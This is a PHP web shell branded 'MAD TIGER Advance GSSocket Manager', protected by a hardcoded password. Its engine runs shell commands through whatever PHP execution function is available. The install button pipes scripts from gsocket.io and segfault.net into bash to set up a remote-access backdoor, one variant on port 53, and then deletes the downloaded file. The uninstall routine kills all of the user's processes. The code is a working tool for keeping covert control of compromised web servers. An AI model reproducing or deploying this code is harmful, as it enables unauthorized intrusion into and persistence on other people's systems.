<?php
session_start();
$password = "007";

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

if (isset($_POST['pass'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        $error = "Invalid Password";
    }
}

if (!isset($_SESSION['auth'])) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>GSSocket Manager - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background: #05050a; color: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-card { background: rgba(20,20,35,0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 40px; width: 350px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
        .logo { width: 60px; margin-bottom: 20px; border-radius: 12px; box-shadow: 0 0 20px rgba(59,130,246,0.3); }
        input { width: 100%; background: #1a1a2e; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; color: #fff; margin-bottom: 20px; outline: none; text-align: center; transition: 0.3s; }
        input:focus { border-color: #3b82f6; box-shadow: 0 0 10px rgba(59,130,246,0.2); }
        button { background: #3b82f6; color: #fff; border: none; border-radius: 8px; padding: 12px 30px; cursor: pointer; font-weight: 600; width: 100%; transition: 0.3s; }
        button:hover { background: #2563eb; transform: translateY(-2px); }
        .error { color: #ff4d4d; font-size: 13px; margin-bottom: 15px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2 style="margin-bottom:25px; font-weight:800; letter-spacing:-0.5px;">Socket Login</h2>
        <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
        <form method="POST">
            <input type="password" name="pass" placeholder="Enter Password" autofocus required>
            <button type="submit">Unlock System</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// === PREMIUM GSSOCKET SYSTEM ===

class BypassEngine {
    public static function run($cmd) {
        $out = "";
        if (function_exists('shell_exec')) { $out = @shell_exec($cmd . " 2>&1"); }
        elseif (function_exists('exec')) { @exec($cmd . " 2>&1", $r); $out = @implode("\n", $r); }
        elseif (function_exists('system')) { ob_start(); @system($cmd . " 2>&1"); $out = ob_get_clean(); }
        elseif (function_exists('passthru')) { ob_start(); @passthru($cmd . " 2>&1"); $out = ob_get_clean(); }
        return $out;
    }
}

class GSSocket {
    public static function manage($action) {
        $out = "";
        if ($action === 'install') {
            $r1 = BypassEngine::run('curl -fsSL https://gsocket.io/y | bash');
            if (empty(trim($r1 ?? ''))) $r1 = BypassEngine::run('wget --no-verbose -O- https://gsocket.io/y | bash');
            $out .= "[1] gsocket.io: " . ($r1 ?: "No output") . "\n";
            $r2 = BypassEngine::run('curl -fsSL http://nossl.segfault.net/deploy-all.sh -o /tmp/deploy-all.sh && bash /tmp/deploy-all.sh');
            $out .= "[2] segfault.net: " . ($r2 ?: "No output") . "\n";
            $r3 = BypassEngine::run('GS_PORT=53 bash /tmp/deploy-all.sh');
            $out .= "[3] GS_PORT=53: " . ($r3 ?: "No output") . "\n";
            @unlink('/tmp/deploy-all.sh'); BypassEngine::run('rm -f /tmp/deploy-all.sh');
        } elseif ($action === 'uninstall') {
            $r1 = BypassEngine::run('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
            if (empty(trim($r1 ?? ''))) $r1 = BypassEngine::run('GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1');
            BypassEngine::run('pkill -u $(whoami) 2>/dev/null'); BypassEngine::run('rm -f /tmp/deploy-all.sh');
            $out .= ($r1 ?: "Uninstall chain executed.") . "\nAll user processes killed.";
        }
        return $out;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['gs_act'])) {
    header('Content-Type: application/json');
    echo json_encode(['out' => GSSocket::manage($_POST['gs_act'])]);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>GSSocket Manager - Mr.X</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #05050a; --bg-card: rgba(20,20,35,0.7);
            --accent: #3b82f6; --red: #ff4d4d; --text: #e2e8f0;
            --text-muted: #94a3b8; --border: rgba(255,255,255,0.1); --glass: blur(12px);
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; }
        .container { width: 100%; max-width: 500px; animation: fadeIn 0.8s ease-out; }
        .glass-card { background: var(--bg-card); backdrop-filter: var(--glass); border: 1px solid var(--border); border-radius: 16px; padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 60px; margin-bottom: 15px; border-radius: 12px; box-shadow: 0 0 20px rgba(59,130,246,0.3); }
        h1 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
        .status-box { background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); border-radius: 8px; padding: 15px; margin-bottom: 25px; }
        .btn-group { display: flex; gap: 15px; }
        .btn { flex: 1; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: 600; border: none; transition: 0.3s; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-primary { background: var(--accent); color: #fff; }
        .btn-danger { background: var(--red); color: #fff; }
        .btn:hover { filter: brightness(1.2); transform: translateY(-2px); }
        .btn:active { transform: scale(0.98); }
        pre { background: #0a0a15; border: 1px solid var(--border); border-radius: 12px; padding: 20px; font-family: 'JetBrains Mono', monospace; font-size: 11px; margin-top: 25px; height: 200px; overflow-y: auto; white-space: pre-wrap; color: var(--text-muted); box-shadow: inset 0 2px 10px rgba(0,0,0,0.4); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .logout { position: fixed; top: 20px; right: 20px; color: var(--text-muted); text-decoration: none; font-size: 11px; border: 1px solid var(--border); padding: 6px 14px; border-radius: 20px; background: rgba(255,255,255,0.03); transition: 0.3s; }
        .logout:hover { background: rgba(255,255,255,0.08); color: #fff; }
    </style>
</head>
<body>
    <a href="?logout=1" class="logout">Logout Account</a>
    <div class="container">
        <div class="glass-card">
            <div class="header">
                <img src="https://i.ibb.co.com/GD0JWrj/Screenshot-2026-03-19-222317.png" class="logo" alt="Logo">
                <h1 style="font-size: 32px; font-weight: 900; line-height: 1.1; margin: 15px 0;">
                    <span style="color:var(--red);">MAD TIGER</span>
                    <span style="color:white; display:block; font-size: 26px;">Advance GSSocket Manager</span>
                </h1>
                <p style="font-size: 13px; margin-top: 20px; color: white; opacity: 0.9;">
                   Telegram ID : <a href="https://t.me/DevidLuice" target="_blank" style="color:white; text-decoration:none; font-weight:700; border-bottom: 2px solid var(--accent);">@DevidLuice</a>
                </p>
            </div>

            <div class="status-box">
                <p style="color: #10b981; font-size: 12px; font-weight: 800; margin-bottom: 5px; text-transform: uppercase;">Ready to Deploy</p>
                <p style="color: var(--text-muted); font-size: 11px; line-height: 1.6;">Automated installer for gsocket.io and segfault.net. All traffic routed through Bypass Engine.</p>
            </div>

            <div class="btn-group">
                <button class="btn btn-primary" onclick="runGS('install')">
                    Deploy System
                </button>
                <button class="btn btn-danger" onclick="runGS('uninstall')">
                    Kill System
                </button>
            </div>

            <pre id="gs-out">System Log: Initialized. Waiting for action...</pre>
        </div>
        <p style="text-align:center; font-size:11px; color:var(--text-muted); margin-top:20px; opacity:0.4;">
            &copy; 2026 MAD TIGER System &bull; Secured with SHA-007
        </p>
    </div>

    <script>
        function runGS(act) {
            const out = document.getElementById('gs-out');
            out.textContent = '>> Executing ' + act.toUpperCase() + ' sequence...\n';
            out.scrollTop = out.scrollHeight;

            const formData = new FormData();
            formData.append('gs_act', act);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => {
                if(!res.ok) throw new Error('Network error');
                return res.json();
            })
            .then(data => {
                out.textContent += '\n>> COMPLETED:\n' + data.out;
                out.scrollTop = out.scrollHeight;
            })
            .catch(err => {
                out.textContent += "\n[CRITICAL ERROR] Connection broken: " + err;
                out.scrollTop = out.scrollHeight;
            });
        }
    </script>
</body>
</html>
